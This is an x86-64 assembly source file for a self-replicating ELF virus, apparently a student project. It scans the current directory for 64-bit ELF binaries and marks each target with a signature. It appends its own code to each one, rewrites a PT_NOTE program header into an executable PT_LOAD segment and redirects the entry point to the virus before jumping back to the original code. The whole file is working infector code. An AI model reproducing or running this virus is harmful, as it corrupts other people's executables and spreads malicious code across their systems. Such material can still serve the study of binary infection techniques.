%include "war.s"

section .text
  global _start

section .text

_start:
  push rdx
  push rsp
  ; deactivate signals?
  sub rsp, STACK_SIZE ; 
  mov r15, rsp ; r15 will be the base of our stack

  ; --- Open "."
  push "." ; push "." to stack (rsp)
  mov rdi, rsp
  mov rsi, O_RDONLY ; 
  xor rdx, rdx ;  no flags
  mov rax, SYS_OPEN ;
  syscall ; open

  pop rdi ; pop the "." we pushed earlier
  cmp rax, 0
  jl cleanup

  ; --- GetDents64
  mov rdi, rax ; move fd into rdi
  lea rsi, [r15 + DIRENT] ; dirent will be in r15 + 400
  mov rdx, DIRENT_SIZE ; 1024, size of a dirent
  mov rax, SYS_GETDENTS64 ; 
  syscall

  mov qword [r15 + DIR_SIZE], rax ; store directory size

  ; --- Close fd
  ; rdi already contains fd
  mov rax, SYS_CLOSE
  syscall

  ; Check if directory size is < 0
  cmp qword [r15 + DIR_SIZE], 0
  jl cleanup

  xor rcx, rcx ; set rcx to 0

  ; --- Loop through files in the directory
  .loop_directory:
    push rcx ; store rcx, used later at the end of the while
    cmp byte[rcx + r15 + DIRENT_D_TYPE], DT_REG ; check if it's a regular file
    jne .next_file

    ; Open file
    lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
    mov rsi, O_RDWR ; Rea + Write rights
    xor rdx, rdx ; no flags
    mov rax, SYS_OPEN
    syscall

    cmp rax, 0
    jle .next_file ; if error, go to next file
    mov r9, rax ; store fd in r9

    ; -- Read Header
    mov rdi, r9 ; load fd into rdi
    lea rsi, [r15 + EHDR]; rsi = ehdr
    mov rdx, EHDR_SIZE ; give it the size we wish to read
    mov r10, 0 ; offset 0
    mov rax, SYS_PREAD64 ; scott why pread ?
    syscall

    ; -- Check header
    cmp dword [r15 + EHDR], ELF64_MAGIC ; Compare with ELF magic
    jnz .close_and_next_file ; not an ELF64, go to next one

    ; Check if it's 64 architecture
    cmp byte [r15 + EHDR_CLASS], ELFCLASS64
    jne .close_and_next_file

    ; Check if it has already been infected
    cmp dword [r15 + EHDR_PAD], SCOTT_SIGNATURE
    jz .close_and_next_file ; file has already been infected

    ; Check for endianness scott
    ; cmp byte [r15 + ehdr.ei_data], 1 ; little endian
    ; jne .close_and_next_file

    ; prepare for loop
    mov r8, [r15 + EHDR_PHOFF] ; load phoffset
    xor rbx, rbx ; initialize phdr loop counter
    xor r14, r14 ; initialize phdr file offset

    .loop_phdr:
      ; -- Read one header
      mov rdi, r9 ; load fd into rdi
      lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
      mov dx, word [r15 + EHDR_PHENTSIZE] ; program header entry size
      mov r10, r8 ; read at ehdr.phoff from r8
      mov rax, SYS_PREAD64
      syscall

      cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
      je .infect ; we found, start infecting

      inc rbx ; add one to phdr loop counter

      cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
      jge .close_and_next_file ; couldn't infect because no PT_NOTE found :'(

      add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
      jmp .loop_phdr ; loop back

    .infect:
      ; Get phdr file offset
      mov ax, bx ; move the loop counter previously in bx to ax
      mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
      imul dx ; multiply dx by ax (phentsize * number_of_ph)
      mov r14w, ax ; store that in r14
      add r14, [r15 + EHDR_PHOFF] ; now add phoffset

      ; -- Fstat
      mov rdi, r9 ; load fd
      lea rsi, [r15 + STAT] ; stat offset on stack
      mov rax, SYS_FSTAT
      syscall

      cmp rax, 0
      jnz .close_and_next_file ; if fstat failed, go to next file

      ; -- Append Virus
      mov rdi, r9 ; load fd
      mov rsi, 0 ; seek offset 0
      mov rdx, SEEK_END ; go to the end of the file
      mov rax, SYS_LSEEK
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file

      push rax ; saving target EOF

      call .delta ; call will push the address of the next instruction on the stack
      .delta:
        pop rbp ; We pop this address into rbp
        sub rbp, .delta ; by substracting delta we get back, we get the adress of the virus at runtime
      
      ; write virus body to the end of the file
      mov rdi, r9 ; load fd
      lea rsi, [rbp + _start] ; load _start address in rsi
      mov rdx, v_stop - _start; virus size
      mov r10, rax ; load target EOF into r10
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file

      ; -- Patch program header
      mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
      mov dword [r15 + PHDR_FLAGS], PF_R | PF_X ; Add read and execute rights to flags
      pop rax ; restore target EOF into rax

      mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
      mov r13, [r15 + ST_SIZE] ; loading st_size in r13
      add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
      mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)

      mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
      add qword [r15 + PHDR_FILESZ], v_stop - _start + JMP_REL_SIZE ; adjust filesize. Add + 5 because of jmp instruction
      add qword [r15 + PHDR_MEMSZ], v_stop - _start + JMP_REL_SIZE ; adjust memsize. Add + 5 because of jmp instruction.

      ; -- Write the patched header
      ; pwrite(fd, buf, count, offset)
      mov rdi, r9 ; load fd 
      lea rsi, [r15 + PHDR_TYPE] ; load the phdr in rsi, buf
      mov dx, word [r15 + EHDR_PHENTSIZE] ; count (size of a ph entry)
      mov r10, r14 ; phdr offset
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jle .close_and_next_file

      ; -- Patch ehdr
      mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
      mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
      mov r13d, SCOTT_SIGNATURE ; load signature
      mov dword [r15 + EHDR_PAD], r13d ; add signature


      ; Write the patched ehdr
      mov rdi, r9 ; load fd
      lea rsi, [r15 + EHDR] ; ehdr offset in stack
      mov rdx, EHDR_SIZE ; size of ehdr we wish to write
      mov r10, 0 ; offset is 0
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file

      ; -- Get to the end of the file
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file

      ; Create patched jmp
      mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
      add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
      sub r14, rdx ; scott
      sub r14, v_stop - _start ; scott
      mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
      mov dword [r15 + JMP_REL + 1], r14d ; scott why

      ; Write patched jmp to EOF
      mov rdi, r9 ; load fd
      lea rsi, [r15 + JMP_REL] ; rsi = patched jmp in stack buffer
      mov rdx, JMP_REL_SIZE ; size of jmp rel
      mov r10, rax ; load new target EOF
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error continue

      mov rax, SYS_SYNC ; committing filesystem caches to disk
      syscall

    .close_and_next_file:
      mov rdi, r9 ; load fd from r9
      mov rax, SYS_CLOSE
      syscall
      jmp .next_file

    .next_file:
      pop rcx ; restore rcx that we previously stored
      add cx, word [rcx + r15 + DIRENT_D_RECLEN]
      cmp rcx, [r15 + DIR_SIZE]
      jl .loop_directory

call show_msg
info_msg:
  db 'SALUT SALUT', 0xa
  info_len equ $ - info_msg

  show_msg:
    pop rsi
    mov rax, SYS_WRITE
    mov rdi, STDOUT
    mov rdx, info_len
    syscall

cleanup:
  ; restore signals ?
  add rsp, STACK_SIZE ; restore rsp
  pop rsp ; restore rsp
  pop rdx ; restore rdx

v_stop:
  xor rdi, rdi ; exit code 0
  mov rax, SYS_EXIT;
  syscall